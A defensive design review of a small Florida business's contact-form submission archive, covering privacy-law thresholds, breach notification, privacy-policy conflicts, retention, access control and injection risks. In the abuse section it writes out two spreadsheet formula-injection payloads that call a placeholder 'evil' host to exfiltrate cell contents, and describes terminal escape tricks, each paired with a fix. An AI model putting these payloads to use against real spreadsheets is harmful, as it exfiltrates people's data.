# 10 · Privacy, retention and abuse

**Summary.** The decision to capture every submission attempt, spam included, is correct and this
document does not argue against it. The cost asymmetry settles it: a captured spam row costs Barbara
ten seconds, a discarded real lead costs the $2,330 mean website job. What this document does is name
what you are accepting when you ship it. The headline findings: **no privacy statute currently reaches
this business**, so the real exposure is their own privacy policy, which contains an unconditional
deletion promise that an append only archive is by construction unable to honour. The free text box is
the entire risk story, because the customer decides what goes in it and a home services company
reliably collects gate codes, occupancy schedules and health information in it. Two live PII near
misses were found and fixed during this work, both one `git add` away from a public repository. And a
retention period is not optional paperwork here: it is the only control that bounds a risk you cannot
prevent at collection time.

---

## 1 · What is actually in the data

### Fields the form sends

Verified against `components/contact-form.tsx` (the `JSON.stringify` body at ~line 538):

| Field | Required | Note |
|---|---|---|
| `firstName` | yes | Last name deliberately dropped on the 2026-07-29 client call |
| `phone` | yes | The only channel the business actually calls back on |
| `email` | yes | |
| `zip` | yes | Kept at Simone's insistence so the office can triage location |
| `service` | no | Native select, one of `SERVICE_OPTIONS` |
| `message` | no | **The whole risk story. See below.** |
| `source` | n/a | Which of the 10 form pages, set by the code not the visitor |
| `token` | n/a | Turnstile credential. Should never be archived, see §6 |
| `turnstileError` | n/a | Added post incident. Client side error code, untrusted, cosmetic |

### Fields the route accepts but the form never sends

From the `Payload` type in `app/api/contact/route.ts`:

```ts
lastName?: string;
name?: string;
city?: string;
```

**Anything can POST these.** They are not in the form body, so in normal operation they are always
absent, but the endpoint is public and unauthenticated. This matters for §3, because `lastName` is the
single field that decides whether a leak is a notifiable breach under Florida law, and a spammer or a
misconfigured integration can populate it at will.

### Fields collected without the visitor typing anything

From `middleware.ts` (first party cookies, `MAX_AGE` = 90 days) and the request headers:

| Field | Source | Note |
|---|---|---|
| `gclid`, `gbraid`, `wbraid`, `msclkid` | cookies set by middleware | Ties a named person to a specific paid ad click |
| `landingPath` | cookie | The page the ad landed on |
| `cf-connecting-ip` | header | Stored on every row |
| `user-agent` | header | Browser, OS version, device class |

### Classification

| Class | Fields |
|---|---|
| Direct identifiers | first name, phone, email |
| Location | zip, IP, landing path, (`city` if ever posted) |
| Device fingerprint | user agent |
| Commercial / behavioural | service, source, four click ids |
| **Unclassifiable** | **`message`** |

### The free text box, which is the actual problem

**You cannot state what the archive contains, because the customer decides.** For a garage door
company specifically, the message box realistically collects:

- **Gate codes and lockbox codes.** "Code is 4417", "key is under the mat". This is a physical access
  credential for someone's house, sitting in a text field.
- **Occupancy schedules.** "Nobody home until 5." Combined with the above, that is a burglary kit.
- **Health information**, offered to explain urgency. "My husband is on oxygen and can't get out",
  "elderly mother lives alone". This is common, not exotic, and it is the field that can flip a leak
  into a notifiable breach (§3).
- **Full street addresses**, pasted despite the field only asking for zip.
- **Insurance claim and policy numbers.** Hurricane adjacent, in Florida.
- **Domestic and legal situations.** "My ex broke the door", police report numbers, landlord disputes.
- Rarely but nonzero over years: a password or a card number typed into the wrong box.

### The exposure nobody raised: you are archiving drafts

This one is specific to capturing every *attempt* rather than every *submission*, and it has no
precedent in the existing design.

The incident timeline shows the visitor's request body growing between attempts, from 244 bytes to 302
bytes, as he edited his message on the second form page. So an attempt log does not record what people
sent you. **It records the drafts they edited out.**

Someone who types something embarrassing, thinks better of it, deletes it and submits the clean
version leaves you both versions. That is a real privacy exposure with **zero business value**: the
customer's considered position is the one they submitted, and the deleted one is information they
actively chose not to give you.

There is no clean technical fix, because refusals are exactly the records you need. The mitigations are
retention (§5) and not treating the archive as a browsable artifact (§6).

---

## 2 · Legal exposure, with the thresholds

Short version: the statutes people worry about do not reach this business. The exposure is their own
privacy policy (§4).

### The Florida Digital Bill of Rights does not apply, by three orders of magnitude

[Fla. Stat. 501.702(9)(a)](https://www.flsenate.gov/Laws/Statutes/2024/501.702) defines "controller"
with six **conjunctive** prongs. All must be true:

1. is a for profit entity
2. does business in Florida
3. collects personal data about consumers
4. determines the purposes and means of processing
5. **makes in excess of $1 billion in global gross annual revenue**
6. **and** satisfies at least one of: 50%+ of revenue from online ad sales; operates a smart speaker
   with a virtual assistant; operates an app store with at least 250,000 apps

This was drafted for Google, Apple, Amazon and Meta. Enforcement is exclusively by the Department of
Legal Affairs, and [501.72(1)](https://www.flsenate.gov/Laws/Statutes/2024/501.72) expressly strips
FDUTPA's private right of action for FDBR violations. The Attorney General's
[February 2026 annual report](https://www.myfloridalegal.com/sites/default/files/2026-02/digital-bill-of-rights-annual-report.pdf)
records **zero penalties issued or collected** in 2025.

This confirms the analysis already in `GTM-NOTES.md`.

### ⚠️ The correction worth recording: 501.715, not 501.71

The broadly applicable sensitive data provision is
**[Fla. Stat. 501.715](https://www.flsenate.gov/Laws/Statutes/2024/501.715)**, not 501.71 (which is
"Controller duties" and is gated behind the full definition above).

501.715 cross references **only prongs 1 through 3** of the controller definition. It deliberately
omits the $1 billion revenue test. **This client is a "person" under 501.715 with no revenue floor.**

It is not triggered today, for one reason: "sensitive data" requires *precise* geolocation, defined at
501.702(22) as a **1,750 foot radius**. A zip code and a city level IP are nowhere near that, and there
is no "sale" of data here.

**The trap to record for the future: if this site ever adds a browser geolocation prompt and passes
that data to an ad platform, 501.715 activates with no revenue threshold at all.** That is a realistic
future feature for a service area business ("find my address"), and it would change the compliance
position overnight.

### No other state law reaches them

Every comprehensive state privacy law except Texas joins its jurisdictional predicate to a numeric
threshold with AND:

| State | Threshold |
|---|---|
| California | [$26,625,000](https://www.cppa.ca.gov/regulations/cpi_adjustment.html) CPI adjusted (eff. Jan 2025), or 100,000 consumers whose data is bought/sold/shared |
| Virginia, Colorado, Oregon, Delaware, New Jersey | 25,000 to 100,000 consumers |
| Texas | No revenue threshold, but exempts SBA small businesses ([HB 4 §541.002(a)(3)](https://capitol.texas.gov/tlodocs/88R/billtext/html/HB00004F.HTM)). NAICS 238290 carries a **$22.0M** size standard; they clear it roughly 10x over |

A single California form submission changes nothing. Post CPRA the California threshold counts only
data **bought, sold or shared**, not merely collected.

### The two threshold free California laws that technically do reach them

- **CalOPPA** ([B&P 22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))
  requires any commercial site collecting from California residents to post a privacy policy. They
  have one. Satisfied.
- **CIPA** (Cal. Penal Code 631/632), $5,000 per violation, **private right of action**. This is a live
  demand letter industry aimed at ordinary Meta and Google tags reading form interactions.

**CIPA is a pixel problem, not an archive problem.** It is about third party tags observing visitors,
not about what you store server side. It is nonetheless the largest threshold free privacy exposure on
this site, and it is worth knowing it exists given the GTM container runs Google Ads, Bing UET and
Microsoft Clarity session recording. Out of scope for this document; flagged for the ads work.

---

## 3 · Florida breach notification, and its sharp edge

**[Fla. Stat. 501.171](https://www.flsenate.gov/Laws/Statutes/2024/501.171) very likely does not cover
this archive as designed. That is good news with a sharp edge attached.**

"Personal information" under (1)(g)1.a. requires **first name or first initial AND last name**, plus
one of the enumerated elements:

| # | Element |
|---|---|
| I | Social security number |
| II | Government issued ID number |
| III | Financial account number + security/access code |
| IV | **Medical history, mental or physical condition, or treatment by a health care professional** |
| V | Health insurance policy or subscriber number |
| VI | **Biometric data** (added by SB 262, eff. 1 July 2024) |
| VII | **"any information regarding an individual's geolocation"** (added by SB 262) |

Prong (1)(g)1.b. is separately email or username **plus a password or security question answer**.

Three consequences:

1. **Name + email does not trigger it. Name + phone does not trigger it.** Neither is an enumerated
   element. This surprises people.
2. **The form captures first name only.** With no surname, prong (a) fails regardless of what else is
   present. So a leak of the archive as designed is probably **not** a notifiable breach.
3. **The free text box is the mechanism that flips this, and nobody controls it but the customer.**

### Why element (VII) deserves attention

Note the drafting asymmetry. Element (VI) says biometric data "as defined in s. 501.702". Element (VII)
says simply **"any information regarding an individual's geolocation"**, with no precision qualifier
and **no cross reference** to the 1,750 foot definition the legislature wrote two sections earlier.

The legislature knew how to narrow it and chose not to.

So the realistic bad path is mundane: a customer types their surname and "my wife is on oxygen" into
the message box. That record now plausibly contains name + medical information (element IV). Add the IP
and zip already stored and element (VII) is arguably in play too.

**Whether an IP address or a zip code counts as "geolocation" under (VII) is genuinely unsettled. There
is no Florida guidance and no case law I could find. That is an attorney question, not one to resolve
by reasoning.**

### Mechanics, if it ever does trigger

| | |
|---|---|
| Notify individuals | within **30 days** |
| Notify Dept. of Legal Affairs | only at **500+** Florida individuals |
| Penalties | $1,000/day for the first 30 days, then $50,000 per 30 day period, **capped at $500,000 per breach** |
| Private right of action | **None.** 501.171(10) expressly establishes none |

Exposure is capped and regulator only. That is a meaningfully better position than most breach regimes.

---

## 4 · The privacy policy, and exactly what becomes untrue

All line numbers verified against `app/privacy-policy/page.tsx` at commit `a71114a`.

### The good news first: there is no retention clause

The policy never states how long data is kept. An indefinite archive therefore contradicts no express
promise. **That removes the strongest deception theory** and leaves only a much weaker omission theory.

### Line 69 is the one clean, self inflicted liability

> "You can contact us at any time to ask what information we have about you, to correct it, or to ask
> us to delete it. You can also tell us to stop following up with you."

Unconditional. Express. No carve out for backups, logs or archives.

**An append only archive is by construction the thing that cannot honour this.** Delete the D1 `leads`
row and the archive silently keeps everything. Under FTC §5, materiality is presumed for express
claims and intent is irrelevant. It is also a clean FDUTPA predicate.

No statute imposed this obligation. They wrote it themselves, and it is the right thing to have
written, so **the design has to earn it**. This single sentence is the strongest argument for the
storage decision in `08-storage-decision.md`, because a per record delete is one SQL statement and
editing a person out of a monthly text file is not (see §5).

**Whatever else is decided: the archive must be deletable per person, or this sentence must change.**

### Line 50 goes flatly untrue

> "Form submissions are sent to us by email and stored in our database."

A third storage location is a third storage location. Same issue at line 42, "Cloudflare hosts the
website and stores form submissions in our database" — if the archive is a D1 table the *processor*
disclosure survives, but the description of where things go does not.

### Line 27 is the subtlest and the sharpest hook

> "When you submit a form, we also record your IP address and browser details **to help us prevent
> spam and abuse**."

That is a **stated purpose limitation**. Retaining the IP indefinitely in a general purpose archive
that also serves ad attribution and lead recovery exceeds the stated purpose. One sentence of
redrafting fixes it. No architecture change required.

### Line 71 is defensible today and indefensible the day a bucket is public

> "We take reasonable steps to protect the information you share with us."

### One pre-existing inaccuracy found while verifying

Line 26 says the form collects "your **name**, phone number, email address, **city**, the service you
need". The form collects **first name** and does **not** collect city at all (`city` is accepted by the
`Payload` type but never sent). Minor, pre-dates this work, worth correcting in the same pass.

### The effective date

Hardcoded at the top of the page, with a comment stating it must be changed by hand only when
substance changes. **This is a substance change.** The file's own comment also notes the legal review
is still outstanding (`CLIENT-ASKS #12`, `LAUNCH-TODO 2.7`). That review is now worth more than it was.

---

## 5 · Retention

### There is no legal duty to keep any of this

The only affirmative Florida obligation runs the other way.
**[501.171(8)](https://www.flsenate.gov/Laws/Statutes/2024/501.171)** requires reasonable measures to
dispose of customer records containing personal information "when the records are no longer to be
retained", by shredding, erasing, or otherwise making them unreadable. It governs **how**, not **when**.

Florida's own articulated standard is a useful benchmark even though it does not bind them:
**[501.719(3)](https://www.flsenate.gov/Laws/Statutes/2024/501.719)** requires controllers to adopt a
retention schedule prohibiting retention beyond the initial purpose, or **two years after the
consumer's last interaction**. Quotable, defensible, and written by the same legislature.

### Recommendation: 90 days for the raw attempt archive

Derived from what the archive is for, not from a legal minimum:

1. **Primary job:** a real customer was refused, find them and call them back. The incident puts that
   window at **hours**, and it was caught in nine days by the slowest possible detector.
2. **Secondary job:** forensics. Did the gate start refusing people around a deploy? A quarter covers
   any deploy cadence this project has ever had.
3. **The owner's stated job**, and this is the part worth saying plainly: **reassurance is served by
   the archive being visibly complete for a window, not by it being infinite.** Nobody has ever gone
   looking for a spam submission from three years ago.
4. **90 days matches the click id lifetime already justified in `middleware.ts`** (`MAX_AGE = 60 * 60 *
   24 * 90`), for three documented and independent Google reasons: `_gcl_aw`'s own lifespan, the
   maximum click through conversion window, and the upload deadline for offline conversions. After 90
   days a large part of each record's attribution value has expired on its own.

Using a number the project already reasoned about beats inventing a new one.

**Real leads in `leads` are a different question and should be kept.** They are business records, about
half of Trinity's jobs are repeat customers, and Housecall Pro is the system of record anyway. For
leads that never converted, 24 months is ample and matches the 501.719(3) benchmark.

### The two clock problem

The shipped code prunes `unverified_leads` at **30 days** (`UNVERIFIED_RETENTION_DAYS = 30`,
`app/api/contact/route.ts:79`), with a good argument in the comment: a row that has sat for a month has
already failed at its only job.

That argument is about **alerting**. The archive has a **forensic** purpose with a longer natural life.
So it is legitimate for them to differ.

But **two retention periods for the same personal data is precisely what makes a deletion request
unanswerable.** You delete from one, forget the other, and the promise at line 69 is quietly broken.

**Recommendation: raise `unverified_leads` to 90 and make them one number**, exported from one place,
read by both pruners, and quoted in the privacy policy. A number written in the policy is what keeps
the code honest.

**Whichever way it goes, the longer clock governs what a deletion request must reach.**

### Deleting one person from a monthly plain text file

This is the practical test of any retention promise, and the file design fails it:

1. Fetch the whole object, parse it, find every matching record. There may be **six**, under slightly
   different spellings and phone formats. The incident customer generated exactly six.
2. Rewrite the whole object. **Live writes are still arriving while you do this, and you will lose
   them.** You would lose leads while honouring a privacy request: the original bug, resurrected,
   during the remedy.
3. Match reliably. "Delete my info, I'm Dave, 813 555 1234." That number might also appear inside
   someone else's message. Grep and delete on a text file has no concept of a record boundary.
4. Any versioning or backup still holds them. Deletion is not deletion.

**Therefore the archive must be record addressable.** Either one row per attempt in D1 (delete is one
`DELETE` by id) or one object per submission (delete is one `DELETE` by key), with the monthly text
file as a **rendered view**. If the design cannot delete one person in one operation, the design is
wrong.

This was **a major input into the storage decision** recorded in `08-storage-decision.md`.

Log deletions as tombstones carrying a hash and a timestamp, never the values you just deleted.

### One more consideration nobody raises

**An indefinite archive is discoverable.** Every record is available to any future plaintiff or
regulator, and a litigation hold freezes the lot. The evidentiary surface grows forever while the
business value decays after week one.

---

## 6 · Access control and blast radius

### The repository is public, and that is verified

```
$ gh repo view --json visibility,nameWithOwner
{"nameWithOwner":"DVitsme/trinitygaragedoorservice","visibility":"PUBLIC"}
```

The archive, and any export of it, **must never touch the working tree**. Not a fixture, not a test
snapshot, not pasted into a markdown doc, not `public/` (served as a static asset), not
`.open-next/assets/`.

### Two live near misses, both found during this work, both fixed

**1. `emails/email-reports/` was untracked and NOT gitignored.** Two files, 31 KB, raw RFC822 dumps of
office lead emails containing a real customer's email address and surname, two real phone numbers, 14
IP addresses and full mail routing headers. `git add -A` would have staged them. They sit inside
`emails/`, a tracked source directory, so `git add emails/` would have swept them in too.

This matters more than its size: **it is the proposal, already built by hand, in the worst possible
location.** Someone wanted a readable record of submissions and created dated plain text files in the
repo. That is exactly the instinct the archive is meant to serve, and it landed one command away from
GitHub.

**2. The first draft of the post-mortem commit carried two customers' IP addresses**, plus verbatim
user agents, ISP, town and the exact minute of six requests. Caught while the commit was still local
and unpushed, redacted, and the commit amended. Had it been pushed, the values would be on GitHub's
servers permanently via forks and caches.

Both are now fixed. `.gitignore` was extended to cover `emails/email-reports/`, `/leads-export/`,
`/leads-archive/`, `/submissions/`, `/.data/`, `*.ndjson` and `.claude/worktrees/`, and all six were
verified ignored.

**Neither of these was caused by a bad decision. Both were caused by nothing being set up to notice.**
That is the same finding as the incident itself.

### R2 exposure traps, recorded even though R2 lost the storage decision

Kept here because the monthly file may still be written to R2 as a pure output sink, and because these
are easy to trip:

- **Buckets are private by default**
  ([docs](https://developers.cloudflare.com/r2/buckets/public-buckets/)), but **attaching a custom
  domain makes the bucket public by default.** Create the Access application *before* attaching the
  domain.
- **If a custom domain and `r2.dev` are both enabled, requests to the `r2.dev` URL bypass your WAF
  rules, Bot Management and Cloudflare Access entirely.** That is the classic way a "protected" bucket
  stays wide open.
- **There is no account level "block public buckets"** equivalent to AWS S3 Block Public Access.
  Control is per bucket only, so the guardrail has to be process, not platform.
- **Presigned URLs** put the credential in the query string, where it lands in browser history,
  `Referer` headers, link previews and terminal scrollback.
  [Max expiry is 7 days](https://developers.cloudflare.com/r2/api/s3/presigned-urls/). If used at all:
  minutes, and never for the whole archive.

### The likeliest failure is a convenience route, and the pattern already exists

`GET /api/contact` is public and unauthenticated. It is well built (booleans only, never values,
`?deep=1` gated) but it establishes the habit "add a GET to inspect state", and the next person adds
`?dump=1`.

**The archive should have no HTTP surface.** If a browsable view is ever built, it goes on a separate
route behind **Cloudflare Access**, never on `/api/contact`, and never behind a secret in a query
param.

Minor, while in there: the public health check currently discloses whether Turnstile is configured,
whether it is a test key, whether HCP sync is on, and the count of office recipients. A small recon
gift. A header check costs nothing.

### The sentence that summarises this section

**A database leak requires a stolen credential. A file leaks by being in the wrong folder.** At this
scale, mistakes are far more common than break ins, and the two near misses above are the evidence.

---

## 7 · Abuse, cost and format injection

Baseline for proportion: the incident investigation found 53 firewall events across three days, all
WordPress and React exploit scans, and **zero events on `/api/*`**. Nobody is targeting this endpoint
today. This is about what becomes possible.

### Only one field is capped

`MAX_STORED_TEXT = 4000` (`app/api/contact/route.ts:89`) applies to `message` and **nothing else**.
`firstName`, `lastName`, `zip`, `email`, `city`, `service` and `source` are all `.trim() || undefined`
with no bound.

Worse, `formatPhone` returns the raw input unchanged when validation fails
(`lib/lead-validation.ts:134`):

```ts
return /^\d{10}$/.test(d) ? `(${d.slice(0,3)}) ${d.slice(3,6)}-${d.slice(6)}` : (raw ?? "");
```

So `phone` is an **unbounded raw passthrough on exactly the path that stores refusals**. There is also
no `Content-Length` check before `req.json()` buffers the body.

**The 4000 char cap creates a false impression of a bounded record. The record is unbounded.**

### The real fuse is the shared D1 write quota

The D1 daily write allowance is **account wide** and shared between the archive and the `leads` table
that carries real revenue. A flood that exhausts it does not degrade gracefully; it takes out every
database on the account ([D1 limits](https://developers.cloudflare.com/d1/platform/limits/)).

Index writes count toward the quota, so each insert costs roughly three rows written.

**This is why rate limiting must land before the archive, not after.** It is the single sequencing
constraint in the whole build order.

### Making the archive unusable is trivial and is the real attack

100,000 plausible looking fake leads with real Florida area codes buries the one real refused customer.
**An archive nobody can read is the same as no archive**, which is the outcome this whole exercise
exists to prevent.

Frame rate limiting to the client that way: it is not a tax on the requirement, it is what makes the
requirement deliverable.

### Format injection: three problems, two solved by one decision

**Record forgery.** With a line oriented text format, a newline in any field forges a record. The
hands on spike proved this is not theoretical: it stored seven submissions and produced a file
presenting **eight** well formed records, with a complete fabricated entry indistinguishable from a
real one. It got in through the `name` field, because only `message` was indented.

**Terminal escape sequences.** `cat` is how an engineer will read this. Raw ANSI can use `\r` and
`\x1b[A` to overwrite lines already printed, so the file **displays** differently from its contents. An
attacker can hide their own entries, or a real customer's. **The archive lies, which is exactly the
failure it exists to prevent.** OSC 8 creates a hyperlink whose display text differs from its target.

**Both are retired by storing NDJSON, one JSON object per line, and rendering prose at read time.**
`JSON.stringify` escapes `\n`, `\r`, quotes and all control characters as `\u00XX` by construction. It
stays greppable, stays readable, and is unforgeable at the record boundary. One format decision, two
whole classes of attack gone.

**Spreadsheet formula injection is the third and needs a separate fix**, because it is the most likely
to actually happen. `LAUNCH-TODO 1.7` commits to a Google Sheets export for the ads specialist, and the
realistic consumer of the archive is someone opening it in Excel. A field starting with `=`, `+`, `-`,
`@`, tab or CR executes as a formula:

- `=HYPERLINK("http://evil/?x="&A1,"Your refund")` exfiltrates the neighbouring cell and looks like a
  legitimate link.
- `=IMPORTXML("http://evil/?"&A2)` in Google Sheets **fires on open with no click.**

Fix at **export** time, not write time, so the stored data stays faithful: prefix any value beginning
with those characters with a single apostrophe. Do not let anyone rename a `.txt` to `.csv`.

Two further vectors that follow from having a large file of untrusted text: rendering it into an HTML
admin page is stored XSS with PII behind it, and feeding it to an LLM to summarise the week's spam is a
prompt injection surface.

### Mitigations, in priority order

| # | Mitigation | Note |
|---|---|---|
| 1 | **Cap every field.** One `MAX_FIELD = 200`, message stays 4000, applied in one place | Highest value per line of code in this document |
| 2 | **Reject bodies over ~32 KB on `Content-Length`** before parsing | |
| 3 | **Rate limit `/api/contact` before the archive ships** | Free plan rate limiting is weak (one rule, 10 second period, IP only). The [Workers rate limiting binding](https://developers.cloudflare.com/workers/runtime-apis/bindings/rate-limit/) is the better answer; **verify Free plan availability on the actual account before designing around it** |
| 4 | **Keep Turnstile** | Nothing here argues for removing it. The archive is the compensating control that makes the gate safe |
| 5 | **Add a honeypot and a time to submit check** | Free, catches naive bots before any write. Already in `05-known-gaps.md` |
| 6 | **Alert on volume** | If the archive grows more than N records in an hour, email someone. Without this a flood is discovered when the bill arrives |

**Workers Logs is not a substitute archive.** Retention is 3 days on Free, 7 on Paid, and 7 is the
maximum on any plan.

---

## 8 · The spam content problem

**What actually arrives**, in rough frequency order for a small US home services form: SEO and web
design pitches, AI and lead gen pitches, crypto, loan and grant offers, adult links, phishing links.
Malware hosting URLs are a real but smaller slice.

**The single biggest mitigating fact: this form accepts no file uploads.** The realistic worst cases
for illegal content are image uploads, forums and anything accepting files. A text only form is a much
narrower channel.

**The honest tail risk.** CSAM is rare in contact form spam but a *link* does occur in high volume form
spam. More common, and more likely to actually land here: threats, harassment aimed at a named
employee, and self harm statements from genuinely distressed people who used the wrong form. That last
one is the case a small office is least prepared for and most likely to meet.

**The legal position, stated with appropriate uncertainty.** US law on possession turns on *knowing*
possession, and an automated log nobody has read is not that. There is no general duty to monitor your
own contact form. Whether a garage door company's contact form makes them a "provider" with a NCMEC
reporting duty under 18 U.S.C. §2258A is genuinely doubtful and this document does not assert it either
way. **This is a check with counsel item, and only if it ever actually happens.**

**What a two person agency should actually do**, about an hour of work total:

1. **Never render links as clickable** anywhere the archive is displayed, and never fetch or preview
   URLs. Plain text nobody clicks makes malicious links inert. Free, and the highest value control
   here.
2. **Bounded retention is the real control.** A 90 day window means anything unpleasant ages out by
   itself. Indefinite retention converts a transient nuisance into a permanent holding. The probability
   of something illegal in any given month is low; over an indefinite horizon it approaches one.
3. **Write down a one paragraph procedure** for "someone found something illegal": stop, do not copy
   it, do not forward it, do not delete it unilaterally, note the timestamp and record id, contact
   counsel the same day. Having it written before it is needed is most of the value, and it stops the
   finder panic deleting, which is its own problem.
4. **Access by search, not by browsing.** Look up a specific person or window. Nobody reads the file
   for entertainment. A habit rather than a control, but it is the habit that keeps the "nobody
   knowingly possesses" position honest.
5. **Never copy the archive into shared Google Drive or a Slack channel.** That is how a private
   nuisance becomes a distribution question.
6. **No antivirus needed.** Plain text, nothing executes, nothing is fetched. Do not let anyone sell a
   product for this.

---

## 9 · What good looks like

**The requirement stands: every submission is accounted for, nothing is silently discarded.**

| Decision | Answer |
|---|---|
| Write path | **D1**, one row per POST, written before any gate, including malformed bodies. See `08-storage-decision.md` |
| The monthly file | A **rendered export**, not the storage format. Year folders, one file per month, every entry timestamped, exactly as asked |
| Format on disk | **NDJSON**, prose at read time. Retires log forgery and terminal escapes for free |
| What is stored | Everything the request carried, plus timestamp, plus the **outcome** and any Turnstile error codes. The whole lesson of this incident is that you need the verdict, not just the payload |
| Field caps | Every field 200 chars, message 4000, body rejected above 32 KB, truncation recorded in the record rather than silent |
| Redaction | **Almost none, deliberately.** The point is fidelity. If someone put a gate code in the message, that is exactly the record you need, and redacting it makes the archive lie. The Turnstile token is the one thing never stored: it is a credential, not content |
| Retention | **90 days**, one number, both pruners, published in the policy |
| Who can read it | No HTTP surface. `wrangler d1 execute` with account credentials. If a browsable view is ever built: separate route, Cloudflare Access |
| Export hygiene | Redact IP and user agent on any export that leaves Cloudflare. Escape leading `= + - @` tab CR if the target could be a spreadsheet |

### Two tiers, which is the move that makes this affordable

- **Tier 1**, anything with a reachable contact: full record.
- **Tier 2**, submissions with no name, no plausible phone and no plausible email: **counted, not
  stored.** An hourly aggregate row with count, distinct IPs, distinct user agents and three samples.

This keeps complete faith with "I would rather have a file filled with spam than have nothing", because
the file still accounts for **every single request** with nothing discarded. And it makes a flood cost
one write an hour instead of one per request.

A line reading "14 August: 41,000 junk submissions from 12 addresses" is genuinely more useful than
41,000 lines nobody will read. **Capture everything is not the same as store every byte of
everything**, and that distinction is what makes the requirement deliverable.

### Non negotiables

1. ~~Redact the customer IPs from the unpushed post-mortem commit, and gitignore
   `emails/email-reports/`~~ **Done 2026-08-12.**
2. Gitignore every plausible archive and export path **before** the feature ships. **Done.**
3. No public archive surface. If R2 is ever used as an output sink: `r2.dev` off, no custom domain on
   the bucket, presigned URLs measured in minutes if used at all.
4. Never read modify write a shared object on the request path.
5. Every field capped, body size capped before parse.
6. **Rate limiting on `/api/contact` before this ships, not after.**
7. A stated retention period, implemented as code that runs, written in the privacy policy.
8. Privacy policy updated in the **same deploy** as the feature: the line 50 storage sentence, the line
   27 IP purpose sentence, a new retention sentence, the line 26 name/city inaccuracy, effective date
   bumped.
9. **One person deletable in one operation.** If the design cannot do that, the design is wrong.

### The risks being accepted, stated plainly

1. You will hold personal data about people who never became customers, including **text they typed and
   then edited out** before submitting.
2. You will occasionally hold things you did not want: gate codes, occupancy schedules, health
   disclosures, and spam content including, over a long enough horizon, illegal material.
3. Your public deletion promise now has a second place to reach. Build for it or you will break it
   without noticing.
4. A public write path with no rate limit is a cost and availability risk to the revenue path, not just
   to the archive. The D1 daily write quota is account wide and shared with real leads.
5. The repo is public, and one careless `git add` publishes customer data. That has nearly happened
   twice already.

---

## 10 · Worth a Florida attorney, ranked

The privacy policy review already flagged in `CLIENT-ASKS #12` is the cheapest item here and it covers
all three:

1. **Consent language and architecture on the form**, if outbound contact is ever automated. This is
   the difference between a $500 nuisance and a class action. Note that a prompt **manual** callback
   answering a genuine enquiry is fine:
   [Fla. Stat. 501.059](https://www.flsenate.gov/Laws/Statutes/2024/501.059)(8)(a) prohibits
   *unsolicited* sales calls using automated dialling or recorded messages and expressly excludes calls
   made "in response to an express request of the person called". **The archive is a callback worklist
   and a forensic record. It is never a list to send anything to.** Write that down.
2. **Whether an IP address or zip code is "information regarding an individual's geolocation"** under
   501.171(1)(g)1.a.(VII). No guidance exists and the text says "any".
3. **Whether a failed submission creates any established business relationship.** No controlling
   authority either way. Note that under
   [47 C.F.R. 64.1200(f)(5)](https://www.law.cornell.edu/cfr/text/47/64.1200) an EBR arising from an
   *inquiry* lasts only **three months**, and that 64.1200(d)(6) requires do not call requests be
   honoured for **5 years** — so a suppression list is the one thing that must **never** be pruned.

---

*Sources are consolidated in [`REFERENCES.md`](REFERENCES.md).*
